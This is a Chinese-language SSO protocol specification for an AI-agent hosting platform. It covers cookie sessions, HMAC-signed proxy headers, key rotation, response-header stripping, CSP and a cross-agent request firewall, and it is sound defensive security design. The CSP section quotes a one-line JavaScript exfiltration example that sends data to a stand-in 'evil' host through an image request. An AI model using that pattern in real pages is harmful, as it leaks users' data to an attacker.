# SSO 协议规范 v1.2

Platform 和 Agent 之间的对接合同。一旦定下,后续每个新 agent 都按这个协议接入。

> v1.0 → v1.1(2026-04-29 上午):子域名 + JWT → 路径同源 + Header 注入
> v1.1 → v1.2(2026-04-29 晚)::3 个独立 review agent 反馈,补齐 5 个 CRITICAL 协议级 bug 和若干 HIGH 项。详见末尾「更改记录」

---

## 0. 角色

| 角色 | URL | 职责 | 部署 |
|---|---|---|---|
| **Landing** | `fiveoranges.ai` | 产品介绍 / 案例 / SEO | Vercel 静态 |
| **Platform-App** | `app.fiveoranges.ai` + `api.fiveoranges.ai` | 生产登录 / Agent 列表 / ACL / 反代 / API 网关 | Mac mini `platform-app` 容器(同进程,Host 分流) |
| **Platform-Demo** | `demo.fiveoranges.ai` | 演示环境(完全独立进程 + 独立 DB + 独立 cookie) | Mac mini `platform-demo` 容器 |
| **Agent (prod)** | `app.fiveoranges.ai/<client>/<agent>/*` | 客户业务前后端 | 独立容器,被 platform-app 反代 |
| **Agent (demo)** | `demo.fiveoranges.ai/<client>/<agent>/*` | 演示用 agent(脱敏数据) | 独立容器,被 platform-demo 反代 |
| **白标(可选)** | `ai.<customer>.com` | 大客户白标域名 | CF for SaaS Custom Hostname → app.fiveoranges.ai(只走 prod) |

> Platform-App 和 Platform-Demo 是**两个独立容器 + 两套独立 DB**,共用代码库但运行时完全隔离。同一个 agent 镜像会**起两个实例**(`agent-yinhu-super-xiaochen-prod` 和 `agent-yinhu-super-xiaochen-demo`),挂在各自的 platform 后面,各拿各的 hmac_secret。

> **容器命名规则**(强制):`agent-<client_id>-<agent_id>`,client / agent 中的连字符保留(例:`agent-yinhu-super-xiaochen`)。Docker Compose service 名同。

---

## 0.1 架构选项对比(留档)

| 维度 | **路径同源 (v1.2)** | 子域名隔离 (v1.0) | iframe-shell(v2 备选) |
|---|---|---|---|
| URL | `/yinhu/super-xiaochen` | `yinhu.agent.domain.com` | `/yinhu/super-xiaochen` 外壳 + iframe 内独立 origin |
| 证书 | 一张通配符 `*.fiveoranges.ai` | 同上 | 通配符 + 每 agent origin 一张 |
| Cookie 隔离 | 同源,XSS 可跨 agent fetch(用 §7.1+§7.2 缓解) | 物理隔离 | 物理隔离 |
| 协议复杂度 | 低 | 高(JWT 签发/验签/replay) | 中(postMessage 握手) |
| 平台是否在流量热路径 | 是 | 否(只在登录跳转) | 是(壳页面)+ iframe 直连 agent |

**v1.2 选路径同源**:协议简单 + 客户少时 XSS 暴露面可控 + 单证书单 tunnel hostname 运维成本低。
**触发切 iframe-shell**:出现「同客户挂多个 agent 且其中之一含第三方代码」或「合规要求 origin 级隔离」。

---

## 1. 信任根

v1.2 鉴权分两层:

### 1.1 用户 ↔ Platform:Session Cookie

- 服务端 session(opaque random 32 字节,base64),存 platform DB
- Cookie:`app_session`
- **Domain 属性必须省略**(host-only cookie),不允许 `Domain=.fiveoranges.ai` 或 `Domain=app.fiveoranges.ai`(两者都会扩散到子域)
- 白标域名收到的请求 `Host: ai.yinhu.com` → 平台同样**不设 Domain**,host-only 自动锁在白标域
- HttpOnly + Secure + SameSite=Lax + Path=/,8h 过期
- **登录必须 rotate session id**:`/auth/login` 成功后**先废弃旧 cookie 值再签发新值**(防 session fixation)
- **Logout 实时撤销**:`POST /auth/logout` → DELETE platform_sessions WHERE id=?,平台每请求都 SELECT 该表(配合 §7.3 in-memory 缓存,真实成本 < 0.1ms)

### 1.2 Platform → Agent 容器:Header 注入 + HMAC 签名

Platform 反代时注入下列 header:

| Header | 含义 |
|---|---|
| `X-Tenant-Client` | 客户 id,例 `yinhu` |
| `X-Tenant-Agent` | agent id,例 `super-xiaochen` |
| `X-User-Id` | platform user id,例 `u_xuzong` |
| `X-User-Name` | 显示名,例 `许总` |
| `X-User-Role` | 角色,例 `user`、`admin` |
| `X-Auth-Timestamp` | unix 秒 |
| `X-Auth-Nonce` | UUIDv4 |
| `X-Auth-Key-Id` | 当前签名密钥 id,例 `2026-04-29-a` |
| `X-Auth-Signature` | base64(HMAC-SHA256(...)),无算法前缀 |

**签名 payload(必须完整,任何字段缺失视为 0 长度但仍 `\n` 占位):**

```
"v1" + "\n" +
ts + "\n" +
nonce + "\n" +
method + "\n" +              ← HTTP method,大写
host + "\n" +                ← 平台收到的 Host 头(可能是 app/demo/api/白标)
path + "\n" +                ← 重写后传给 agent 的 path,**含 query string**
client + "\n" +
agent + "\n" +
user_id + "\n" +
user_role + "\n" +
hex(sha256(body))            ← body 为空时 hex(sha256(b""))
```

签名覆盖 method / host / path / role / body-hash 是必须的 —— 缺任何一项都打开角色提权或跨端点重放窗口。

**Agent 容器验证规则**(任一失败立即 401,顺序固定):

1. `X-Auth-Key-Id` 在本容器已加载的 key 集合中(支持新旧两 key 共存,见 §1.3)
2. **算法硬编码 SHA-256**,不读 header,不接受任何算法前缀
3. 计算签名,`hmac.compare_digest` 比对
4. `now - ts ∈ [-5, 10]`(允许 5s 时钟漂移,replay 窗口收紧到 10s)
5. `X-Tenant-Client == TENANT_CLIENT env`、`X-Tenant-Agent == TENANT_AGENT env`
6. `(key_id, nonce)` 不在 nonce store 中(**强制实施**,不再可选);通过后写入,TTL = 25s

### 1.3 Per-Tenant HMAC Secret + 密钥轮换

- Platform DB `tenants.hmac_secret_current` + `tenants.hmac_secret_prev`(prev 为空字符串表示无旧 key)
- Agent .env:`HMAC_SECRET_CURRENT` + `HMAC_SECRET_PREV` + `HMAC_KEY_ID_CURRENT` + `HMAC_KEY_ID_PREV`
- 集中部署:平台和 agent 通过 env 共享同一对 key
- 混合部署:平台生成新 key → 加密渠道发给客户 → 客户 .env 更新 → `docker compose restart agent` → 平台从该时刻起用新 key id 签发
- **轮换时序**:
  1. 平台生成 new (id_b, secret_b),写入 `hmac_secret_current = secret_b`,`hmac_secret_prev = secret_a`(旧 a)
  2. 通知客户更新 .env,**保留 a 作为 prev**
  3. 平台从此用 b 签发(`X-Auth-Key-Id: id_b`)
  4. T+24h 后,平台清空 prev(置空字符串),agent .env 也清空 PREV
- Agent 接受任一在加载 key 集合中的 id;两 key 都失败 → 401

### 1.4 API 调用:Bearer Token

API 网关 `api.fiveoranges.ai/v1/agents/<client>/<agent>/*`:

- `Authorization: Bearer <token>`
- 网关验签 → 注入与 §1.2 相同的 X-* 头转 agent
- **Token 来源严格**:
  - **管理后台手工创建**(用户在 platform UI 里)—— 推荐
  - `/v1/auth/exchange`(用户 cookie session → 短期 token):**必须**满足 a) 携带 X-CSRF-Token、b) 触发再次密码确认(v1.2 是密码,v2 升 MFA)、c) 最长 1h、d) `api_keys.source_session_id` 绑定源 session
- **级联撤销**:删 platform_sessions 行 → 后台任务 `UPDATE api_keys SET revoked_at=now WHERE source_session_id=?`
- **CORS 策略**(api.fiveoranges.ai 唯一一处需要 CORS):
  - `Access-Control-Allow-Origin`: 仅 `https://fiveoranges.ai` + 已注册的白标域;**不允许** `*`
  - `Access-Control-Allow-Credentials: true`
  - `Access-Control-Allow-Headers: Authorization, X-CSRF-Token, Content-Type`
  - 预检 OPTIONS 缓存 1h

---

## 2. 端点

### Platform 提供

```
POST /auth/login             → 验证密码;rotate session id;Set-Cookie app_session + app_csrf
POST /auth/logout            → 实时撤销 session + 级联撤销关联 api_keys
GET  /api/me                 → 当前用户信息
GET  /api/agents             → 当前用户可见 (client, agent) 列表 + health 状态
GET  /api/keys               → 列出 / 创建 / 吊销 API token
POST /csp-report             → 接收 CSP violation 报告(v1.2 必须实现,见 §7.1)

GET  /<client>/<agent>/*     → ACL 检查 → 反代到 agent 容器
POST /<client>/<agent>/*     → 同上,SSE 透传
```

### Agent 容器提供

```
GET  /healthz                → 200 OK,平台每 30s 探测(填 tenants.health)
GET  /                       → 业务前端(读 X-User-* 渲染)
其他业务路由                 → 全部读 X-User-Id / X-Tenant-* 拿上下文
```

**Agent 不实现**:`/login`、`/logout`、cookie 管理、JWT 验签。

### API 网关提供

```
POST /v1/auth/exchange       → cookie session → 短期 API token(必须再次密码确认)
GET/POST /v1/agents/<client>/<agent>/*  → Bearer 鉴权 + 反代
```

---

## 3. 路径路由规则

请求 `app.fiveoranges.ai/yinhu/super-xiaochen/chat?foo=bar`:

```
1. Platform 接到请求,匹配 /<client>/<agent>/*
   → client="yinhu", agent="super-xiaochen", subpath="/chat?foo=bar"
2. 校验 cookie app_session  → user_id, user_role
3. **§7.2 跨 agent 防火墙**:Sec-Fetch-Mode + Referer 路径前缀检查
4. 校验 ACL: user_tenant 表
5. 查 tenants[(yinhu, super-xiaochen)] → container_url, hmac_secret_current, key_id_current
6. 重写 path:`/yinhu/super-xiaochen/chat?foo=bar` → `/chat?foo=bar`
7. 计算签名(§1.2,**body 也要 hash**)
8. **§3.1 响应头净化**:配置反代去除恶意头
9. httpx.stream 反代,完整透传 SSE
10. 写 proxy log(URL **path only,不含 query**;status;user_id;时间;**不写 body / cookie / header**)
```

ACL 失败 403;tenant 不存在 404;agent 容器超时 503;`/healthz` 标红的 tenant → 502 + 友好提示。

### 3.1 响应头净化(关键安全控制)

**问题**:同源下 agent 返回的 `Set-Cookie` 会被浏览器接受并覆盖 `app_session`(攻击 → agent 能改用户 session)。

**强制规则**:平台反代必须从 agent 响应中**剥离或重写**以下 header:

| Header | 处理 |
|---|---|
| `Set-Cookie` | 完全剥离,除非 cookie 名在白名单(默认空白名单);白名单内的 cookie 名必须以 `<client>_<agent>_` 前缀 |
| `Strict-Transport-Security` | 剥离,平台统一注入 |
| `Content-Security-Policy` | 与平台默认比较;若 agent 的更弱(更宽)→ 覆盖回平台默认;若更严 → 透传 |
| `X-Frame-Options` | 剥离,平台统一注入 `DENY` |
| `Access-Control-Allow-*` | 剥离(api.fiveoranges.ai 之外不允许 CORS) |
| `Server` / `X-Powered-By` | 剥离(信息泄漏) |

实现:平台反代代码里维护一个 hop-by-hop + sensitive header 列表,默认剥离;白名单通过 `tenants.allowed_response_headers` JSON 列配置(见 §5)。

### 3.2 SSE / 长连接 keepalive

CF Tunnel 默认 100s 空闲超时。Agent 在长 tool-call 期间(可能 60s+)**必须每 20s 发送 SSE 注释帧**:

```
:keepalive\n\n
```

平台反代不缓冲 / 不解释 / 完整透传。`X-Accel-Buffering: no` 加在响应头,告诉中间人不要缓冲。

---

## 4. Cookies

| Cookie | 设置者 | Domain | Path | 生命 | Flags |
|---|---|---|---|---|---|
| `app_session` | platform | **省略**(host-only) | `/` | 8h | HttpOnly Secure SameSite=Lax |
| `app_csrf` | platform | **省略** | `/` | 8h | Secure SameSite=Strict(**不**HttpOnly,JS 要读) |

`app_csrf` 值是 random 32 字节 base64。前端 SDK 读取后塞到 `X-CSRF-Token` header(见 §7.2)。

**Path 不要乱玩**:固定 `/`。不要尝试用 `Path=/yinhu/super-xiaochen` 做隔离 —— 同源下 XSS 仍能 set 任意 path 的 cookie 覆盖。

---

## 5. 数据库 Schema

```sql
CREATE TABLE users (
  id            TEXT PRIMARY KEY,
  username      TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  display_name  TEXT NOT NULL,
  email         TEXT,
  created_at    INTEGER NOT NULL,
  last_login    INTEGER
);

CREATE TABLE tenants (
  client_id              TEXT NOT NULL,
  agent_id               TEXT NOT NULL,
  display_name           TEXT NOT NULL,
  container_url          TEXT NOT NULL,
  hmac_secret_current    TEXT NOT NULL,
  hmac_key_id_current    TEXT NOT NULL,
  hmac_secret_prev       TEXT NOT NULL DEFAULT '',  -- 轮换期非空
  hmac_key_id_prev       TEXT NOT NULL DEFAULT '',
  hmac_rotated_at        INTEGER,
  agent_version          TEXT NOT NULL DEFAULT 'unknown',  -- "yinhu-1.0.0"
  health                 TEXT NOT NULL DEFAULT 'unknown',  -- 'healthy' | 'unhealthy' | 'unknown'
  health_checked_at      INTEGER,
  allowed_response_headers TEXT NOT NULL DEFAULT '[]',  -- JSON 白名单
  icon_url               TEXT,
  description            TEXT,
  visibility             TEXT NOT NULL DEFAULT 'private',  -- 'public' | 'private' | 'demo'
  active                 INTEGER NOT NULL DEFAULT 1,
  tenant_uid             TEXT NOT NULL UNIQUE,  -- UUID,日志和外部引用用,与 (client, agent) 解耦
  created_at             INTEGER NOT NULL,
  PRIMARY KEY (client_id, agent_id)
);

CREATE TABLE user_tenant (
  user_id       TEXT NOT NULL REFERENCES users(id),
  client_id     TEXT NOT NULL,
  agent_id      TEXT NOT NULL,
  role          TEXT NOT NULL DEFAULT 'user',
  granted_at    INTEGER NOT NULL,
  granted_by    TEXT,
  PRIMARY KEY (user_id, client_id, agent_id),
  FOREIGN KEY (client_id, agent_id) REFERENCES tenants(client_id, agent_id)
);

CREATE TABLE platform_sessions (
  id            TEXT PRIMARY KEY,
  user_id       TEXT NOT NULL REFERENCES users(id),
  csrf_token    TEXT NOT NULL,             -- 平台同时签发 app_csrf
  created_at    INTEGER NOT NULL,
  expires_at    INTEGER NOT NULL,
  ip            TEXT,
  user_agent    TEXT
);

CREATE TABLE api_keys (
  id                TEXT PRIMARY KEY,
  user_id           TEXT NOT NULL REFERENCES users(id),
  client_id         TEXT NOT NULL,
  agent_id          TEXT NOT NULL,
  name              TEXT NOT NULL,
  prefix            TEXT NOT NULL,
  hash              TEXT NOT NULL,
  scope             TEXT NOT NULL DEFAULT 'rw',
  source_session_id TEXT REFERENCES platform_sessions(id),  -- exchange 出来的绑定源 session
  expires_at        INTEGER,                                 -- exchange tokens 强制 ≤ now+1h
  created_at        INTEGER NOT NULL,
  last_used         INTEGER,
  revoked_at        INTEGER,
  FOREIGN KEY (client_id, agent_id) REFERENCES tenants(client_id, agent_id)
);

CREATE TABLE proxy_log (
  id          INTEGER PRIMARY KEY AUTOINCREMENT,
  ts          INTEGER NOT NULL,
  user_id     TEXT,
  client_id   TEXT,
  agent_id    TEXT,
  method      TEXT,
  path        TEXT,                  -- query 已剥离
  status      INTEGER,
  duration_ms INTEGER,
  ip          TEXT
);

CREATE INDEX idx_sessions_user ON platform_sessions(user_id);
CREATE INDEX idx_keys_user ON api_keys(user_id);
CREATE INDEX idx_proxy_log_ts ON proxy_log(ts);
```

约束:`client_id` / `agent_id` 必须 `^[a-z0-9-]{1,32}$`(URL 安全)。

**注**:`proxy_log` 建议拆到独立 sqlite 文件(参见 §7.3),避免写入与读 hot path 在同 WAL 上竞争。

---

## 6. 完整时序

```
浏览器              Platform                      Agent
  │                   │                             │
  │── GET / ─────────▶│                             │
  │◀── login.html ────│                             │
  │                   │                             │
  │── POST /auth/login (含 X-CSRF-Token 若有旧)──▶│
  │                   │ bcrypt 验证(无论用户是否存在都跑)│
  │                   │ DELETE old session          │
  │                   │ INSERT new session + csrf   │
  │◀── Set-Cookie ────│ (app_session + app_csrf)    │
  │                   │                             │
  │── GET /api/agents ▶│ JOIN user_tenant, tenants  │
  │◀── [{...,health}]─│                             │
  │                   │                             │
  │── GET /yinhu/super-xiaochen/chat ────────────────│
  │   含 cookie app_session, app_csrf, X-CSRF-Token │
  │                   │                             │
  │                   │ §7.2 防火墙:               │
  │                   │   Sec-Fetch-Mode == cors?   │
  │                   │   → Referer path 前缀 == /yinhu/super-xiaochen/  │
  │                   │   X-CSRF-Token == app_csrf? │
  │                   │                             │
  │                   │ ACL + 重写 path             │
  │                   │ 签名 (含 method/path/body)  │
  │                   │ 反代 ──────────────────────▶│ §1.2 验签
  │                   │                             │ 处理业务
  │                   │ §3.1 响应头净化             │
  │◀──── 透传响应,SSE 流式 ──────────────────────│
```

---

## 7. 安全考量

| 威胁 | 缓解 |
|---|---|
| **Agent 响应 Set-Cookie 覆盖 app_session** | §3.1 平台强制剥离 Set-Cookie(白名单除外) |
| **签名 payload 不完整 → 角色提权 / 跨端点重放** | §1.2 签 method/host/path/role/body-hash + 强制 nonce + 10s 窗口 |
| **跨 agent CSRF / XSS 同源 fetch** | §7.2 平台层防火墙(Sec-Fetch-Mode + Referer 路径) + per-tenant CSRF token |
| **XSS in agent → 偷 cookie** | (1) `app_session` HttpOnly;(2) §7.1 严格 CSP;(3) Trusted Types |
| **CSRF cross-site** | SameSite=Lax(app_session)+ SameSite=Strict(app_csrf) |
| **客户绕过 platform 直连容器** | (1) Docker network 只对 platform 开放;(2) HMAC 验签 |
| **客户侧 cloudflared 重放/篡改(§11)** | §1.2 完整签名 + 强制 nonce 防重放;customer 可观测 X-User-* 但不能伪造 |
| **Replay** | 强制 nonce store,10s 窗口,key+nonce 联合主键 |
| **Platform 0day** | (1) 平台代码量小;(2) hmac_secret 走 macOS Keychain 或 SOPS;(3) 关键客户 §11 |
| **API token 泄漏** | bcrypt 哈希;exchange token ≤1h + 绑定源 session;后台一键吊销 + 级联 |
| **Stolen cookie → exchange API token** | §1.4 exchange 强制再次密码确认(v2 升 MFA) |
| **Session fixation** | §1.1 登录 rotate session id |
| **登录 timing oracle** | bcrypt **必须无条件运行**,即使用户不存在(用 dummy hash) |
| **白标 cookie 错位** | 强制 host-only(省略 Domain);白标走 CF for SaaS |
| **算法降级** | 算法硬编码 SHA-256,签名 header 是纯 base64,**无算法前缀** |
| **时钟漂移** | 容忍 5s 漂移,Mac mini NTP 强制启用 |
| **登录暴破** | 5/min/IP + 10/h/username,失败累计 → 滑动验证码 |
| **proxy log 信息泄漏** | path 入库前剥离 query string;不写 body/cookie/header |
| **demo 滥用** | demo 域全局 100/h/IP;demo session 1h 过期;每天 3am reset |
| **SEO 索引泄漏客户名** | app/demo/api 强制 `X-Robots-Tag: noindex`;主域单独 robots.txt |

**审计姿态**(替换原「平台 <500 LOC」表述):
- 依赖锁定(`uv.lock` / `pip-tools` 固化版本)
- CI 跑 `bandit` + `semgrep` + `trivy`(容器漏洞)
- 反代核心模块单文件 + 100% 行覆盖测试
- 6 个明确的信任边界(浏览器→平台 / 平台→agent / 平台→DB / agent→外部 API / 客户网络→平台 / 平台运维→生产 secrets)各有专项测试

### 7.1 CSP 模板(平台反代默认注入)

```
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'strict-dynamic' 'nonce-{request_nonce}';
  style-src 'self';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  worker-src 'self';
  manifest-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
  require-trusted-types-for 'script';
  report-uri /csp-report;
```

**强制响应头**(平台统一注入):

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
X-Robots-Tag: noindex, nofollow         (app/demo/api 强制;主域不加)
```

**关键禁用项说明**:
- 无 `'unsafe-inline'` / `'unsafe-eval'` / `data:` for script
- 无 `style-src 'unsafe-inline'`(从 v1.1 收紧;agent 把内联样式改外部 CSS)
- `img-src` **不含** https: 通配(防 `new Image().src='https://evil/?leak='+...` 外带数据)
- `'strict-dynamic'` + nonce:防 script-gadget 攻击
- `require-trusted-types-for 'script'`:强制 Trusted Types
- `frame-ancestors 'none'`:防点击劫持 + 防 agent 套娃

**WASM 政策**:v1.2 **禁止 WebAssembly**(即不加 `'wasm-unsafe-eval'`)。需要 WASM 的 agent 必须申请白名单,显式列入 `tenants.csp_overrides` JSON 字段(预留,v1.3 实现)。

**CSP nonce 注入**:平台反代每请求生成一个 nonce,塞进响应头 + agent 渲染的 HTML 里(由 agent 后端从环境注入到模板)。Agent 必须读取请求级 nonce 渲染 `<script nonce="...">`,**禁止**在 agent 自己生成 nonce。

**CSP violation 收集**:平台实现 `POST /csp-report`,接收浏览器上报,写 `proxy_log` 同结构;每天聚合告警高频 violation。

### 7.2 跨 agent 请求防火墙(关键控制)

**问题**:同源下 XSS in agent A 可以 fetch `/yinhu-other/agent/anything`,SameSite 不拦,Origin 头一样。

**强制规则**:平台反代到 `/<client>/<agent>/*` 时,先做以下检查:

| 请求类型 | 判定依据 | 通过条件 |
|---|---|---|
| 顶级导航 | `Sec-Fetch-Mode: navigate` | 直接放行(用户点链接) |
| Same-origin fetch / XHR | `Sec-Fetch-Mode: cors`、`Sec-Fetch-Site: same-origin` | (1) `Referer` 路径以 `/<dest_client>/<dest_agent>/` 开头;(2) `X-CSRF-Token` header == `app_csrf` cookie 值 |
| 跨 site | `Sec-Fetch-Site: cross-site` | api.fiveoranges.ai 例外(走 §1.4 CORS);其他一律拒绝 |
| 缺 Sec-Fetch-* 头(老浏览器) | 无 | 拒绝(v1.2 不支持) |

CSRF token 派发逻辑:
- 登录时签 `app_csrf` cookie(SameSite=Strict,非 HttpOnly)
- 平台前端 SDK 自动从 cookie 读出值,塞进所有非 GET 请求的 `X-CSRF-Token` header
- 平台验证 `header value == cookie value`(double-submit pattern)
- 任何检查失败 → 403 + log

> **为什么不用 per-tenant CSRF token**:理论上 `HMAC(csrf_master, client||agent)` 派发到 agent 页面 meta 可以让 XSS in A 偷不到 B 的 token。但实操中,A 的 XSS 可以同源 GET B 的页面拿 meta —— 防御失效。所以靠 §7.2 的 Referer 路径检查在反代层拦截才是真防御,CSRF token 是 defense-in-depth。

### 7.3 in-memory 缓存策略(性能 + DB 锁)

每请求读 3 次 DB(session / user_tenant / tenants)在 50+ 客户后会被 sqlite WAL 锁炸。强制实施:

| 对象 | 缓存 TTL | 失效触发 |
|---|---|---|
| `tenants` 行 | 60s | 平台显式 `invalidate(client, agent)`(密钥轮换 / health 变化时) |
| `platform_sessions` 命中 | 30s | logout 显式 `invalidate(session_id)` |
| `user_tenant` ACL 命中 | 60s | 用户授权变更显式失效 |

实现:Python `cachetools.TTLCache`,容量 10000。多进程时(uvicorn workers > 1)缓存不共享,接受 60s 不一致窗口。

`proxy_log` 写到独立 sqlite 文件(`platform_proxy.db`)避免 WAL 与主 DB 竞争;老化策略:90 天后归档到 JSONL gz。

---

## 8. 错误响应

```json
{ "error": "code", "message": "中文用户可读" }
```

| code | HTTP | 含义 |
|---|---|---|
| `not_logged_in` | 401 | 没有 session cookie |
| `session_expired` | 401 | session 过期或被撤销 |
| `invalid_credentials` | 401 | 用户名/密码错 |
| `csrf_failure` | 403 | CSRF token 缺失/不匹配 |
| `cross_agent_blocked` | 403 | §7.2 防火墙拦截 |
| `not_authorized_for_tenant` | 403 | ACL 拒绝 |
| `unknown_tenant` | 404 | tenant 不存在 |
| `agent_unavailable` | 503 | tenants.health == 'unhealthy' |
| `agent_timeout` | 504 | 反代上游超时 |
| `rate_limited` | 429 | 限流 |
| `signature_invalid` | 401 | (内部 only,agent → platform 排错) |

---

## 9. 版本演进

- v1.0 → v1.1:子域名 + JWT → 路径同源 + Header
- v1.1 → v1.2:**破坏性**变化(每个已实现 agent 都需更新):
  - 签名 payload 加 method/host/path/role/body-hash(§1.2)
  - 新增 `X-Auth-Key-Id` header 和密钥轮换协议(§1.3)
  - nonce 强制
  - 平台必须实施 §3.1 响应头净化、§7.2 防火墙、§7.3 缓存
  - tenants 表加 health / agent_version / hmac_secret_prev / tenant_uid 等列
- v1.2 → v1.3 计划:MFA(TOTP)、CSP override 白名单、agent 灰度版本路由

---

## 10. 实现 checklist

### Agent 端
- [ ] 监听 `0.0.0.0:8000`,只对 platform Docker network 开放
- [ ] env:`TENANT_CLIENT` / `TENANT_AGENT` / `HMAC_SECRET_CURRENT` / `HMAC_KEY_ID_CURRENT` / `HMAC_SECRET_PREV` / `HMAC_KEY_ID_PREV` / `DATA_DIR`
- [ ] 实现 §1.2 验签中间件(完整 payload + 算法硬编码 + nonce store)
- [ ] 实现 nonce store(进程内 TTL set,容量 100k)
- [ ] 业务路由读 `X-User-*` / `X-Tenant-*` 拿上下文
- [ ] **不**实现登录/cookie/JWT
- [ ] 实现 `/healthz` 端点
- [ ] CSP nonce 渲染:从请求 header 读 nonce,塞 HTML
- [ ] 长 SSE 加 20s `:keepalive\n\n`
- [ ] 容器日志**不输出** secret / cookie / signature
- [ ] 前端 HTML 注入 `<base href="/<client>/<agent>/">`,所有 fetch 改相对路径
- [ ] **同步 SDK 注意**:Anthropic SDK 用 `AsyncAnthropic` 或 `run_in_threadpool`,不要在 async handler 里直接调同步 stream

### Platform 端
- [ ] tenants 表插行;hmac_secret 用 `secrets.token_urlsafe(32)`
- [ ] 反代实现 §3 + §3.1 + §3.2 + §7.2 + §7.3
- [ ] httpx `client.stream()` + `iter_raw()` + `StreamingResponse`,**绝对不要** `client.post()`
- [ ] 浏览器断开 → `request.is_disconnected()` 监听 → 关闭上游
- [ ] 注入 §7.1 全套响应头 + 请求级 CSP nonce
- [ ] CF Tunnel ingress 配两条 hostname → `platform-app:80`
- [ ] /healthz 探测后台任务(每 30s 跑一遍 tenants 表)
- [ ] 密钥轮换 admin CLI

### 部署 / 运维
- [ ] Mac mini NTP 启用
- [ ] colima 而非 Docker Desktop(后者要 GUI 登录才启动)
- [ ] launchd plist `LimitNOFILE=8192`
- [ ] sqlite 每晚 backup 到加密 B2 / 阿里云 OSS
- [ ] `docker compose logs` JSON 驱动 + max-size 限制

---

## 11. 混合部署模式(数据驻留客户网络)

### 11.1 拓扑

```
[fiveoranges 云 / Mac mini]                  [客户网络 / 客户云]
  Platform-App                                  agent 容器
  + cloudflared                                 + cloudflared (反向出连)
                                                + .env (HMAC_SECRET_*, ERP 凭据)
                                                + 数据卷 /data
                                                + Kingdee 直连
```

> **拓扑澄清**:浏览器→平台是一条 CF Tunnel(`app.fiveoranges.ai`);平台→agent 是另一条 CF Tunnel(从客户 cloudflared 出连)。**两条独立的 CF 路径**,不是同一条。

### 11.2 反向连接方案(同 v1.1)

| 方案 | 优 | 缺 |
|---|---|---|
| Cloudflare Tunnel(推荐) | 零运维 | 走 CF |
| frp 自建 | 全自控 | 你要运维 frps + TLS |
| Tailscale | 5 分钟 | 大陆可达性看运气 |

### 11.3 Per-Tenant Secret 分发

- 平台生成 → age 加密 / Signal / 飞书私聊 → 客户运维
- 客户 .env 注入 → restart 容器
- **绝不**走明文邮件 / 微信 / 钉钉

### 11.4 信任模型(v1.2 更新)

| 角色 | 权能 | 不能做 |
|---|---|---|
| 平台运维 | 知 user / tenant / proxy log(URL+时间+user_id) | 不知 业务数据 / ERP 凭据 / 对话内容 |
| 客户 A 运维 | 知 agent A 的 secret + .env + 数据卷;**可观测** X-User-Id / X-User-Name / 请求 path | **不能**伪造对 agent A 的写入(签名要 platform 签);不能影响 agent B |
| 客户 B 运维 | 同上,只对自家 | 同上 |

**v1.2 关键披露(给客户合同)**:
- 客户的 cloudflared 是 TLS 终结点,平台→agent 在客户内网段是明文
- 客户能看到所有访问该 agent 的 platform 用户身份(X-User-Id / X-User-Name / X-User-Role)
- 客户**无法**伪造请求(因为签名覆盖 method/path/body,且密钥客户也持有但不能签 platform 没批准的请求 —— 实际上客户能签自己想签的,但 §1.2 替换不了 platform 已发出的请求,只能看;客户作伪要绕过 platform 进 agent,但 agent 仍会因 nonce store 拒绝 platform 没发过的请求 → **此处依赖 nonce store 的强制性**,这就是为什么 v1.2 把它从「可选」改「必须」)

### 11.5 数据驻留承诺(v1.2)

平台**不存储**:业务数据 / ERP 凭据 / agent 数据卷 / 对话内容 / 文件
平台**存储**:user / tenant 注册表(含 hmac_secret) / user_tenant ACL / api_keys hash / platform_sessions / proxy_log(path 已剥离 query)

### 11.6 健康检查(v1.2 新增)

- 平台后台任务每 30s GET 每个 tenant 的 `<container_url>/healthz`,5s 超时
- 结果写 `tenants.health` + `health_checked_at`
- `/api/agents` 返回 health 状态;前端不健康标灰
- 用户点不健康 agent → 平台返回 502 + 友好提示「客户网络不可达,联系客户运维」**不要**让浏览器去碰 504

### 11.7 镜像分发与升级

- ACR 推镜像 + cosign 签名
- 客户 `docker pull` + 可选 `cosign verify`
- 升级窗口客户自定;平台支持当前 minor + 上一个 minor 至少 30 天
- `tenants.agent_version` 字段记录当前版本;客户 docker tag 启动时上报到 platform(扩展 `/healthz` 返回 JSON 含 `version`)

### 11.8 上线流程
1. 平台:tenants 表插行,生成 hmac_secret + key_id
2. 平台:加密包(secret + .env 模板 + docker-compose.yml)给客户
3. 客户:出口防火墙允许 cloudflared
4. 客户:`docker compose up -d`
5. 客户:cloudflared 反连 + CF dashboard 加 public hostname
6. 平台:`/healthz` 验证 + 写 health
7. 平台:user_tenant 授权目标用户
8. 用户登录 → 看到该 agent → 走 §6

---

## 12. 实施路径

### 12.1 阶段 1:超级小陈作为银湖正式产品上线

**定位**:超级小陈 = 银湖真实生产 agent,**走 prod (app),不是 demo**。

**诚实时间表(综合 review 估算)**:
- W1 末:许总能登录、看 agent 列表、点进去看到 healthcheck 页(协议层通)
- W2 末:真能跟超级小陈对话,SSE 流式,CF Tunnel 稳
- 总工作量:**8-11 个工作日**,不是「本周」

```
app.fiveoranges.ai/yinhu/super-xiaochen
   │
   └─ (CF Tunnel) → Mac mini → platform-app 容器
                                  │
                                  └─→ agent-yinhu-super-xiaochen 容器
```

**最小可执行步骤(每步 30min - 4h)**:
1. (1h) DNS:fiveoranges.ai 在 CF;CF Tunnel 创建,拿 TUNNEL_TOKEN
2. (1h) 仓库脚手架 `~/agent-platform/{platform-app, docker-compose.yml, cloudflared/config.yml}` + §5 schema 迁移脚本
3. (3h) platform-app:`/auth/login` + cookie + session rotate + `/api/me` + 登录页 HTML
4. (0.5h) admin CLI:`add-user` / `add-tenant` / `grant`;seed `xuzong` + `(yinhu, super-xiaochen)`
5. (2h) 生成 HMAC + key_id,写 DB + agent .env;先**直接** docker run agent 验证 `/healthz` 通(还没接平台)
6. (1h) 改造 web_agent.py:`require_auth` → §1.2 验签中间件,带 nonce store
7. (2h) 前端 `<base href>` 注入 + `static/app.js` 所有 fetch 改相对路径;直接 docker 验证仍可用(用 curl 伪造 header)
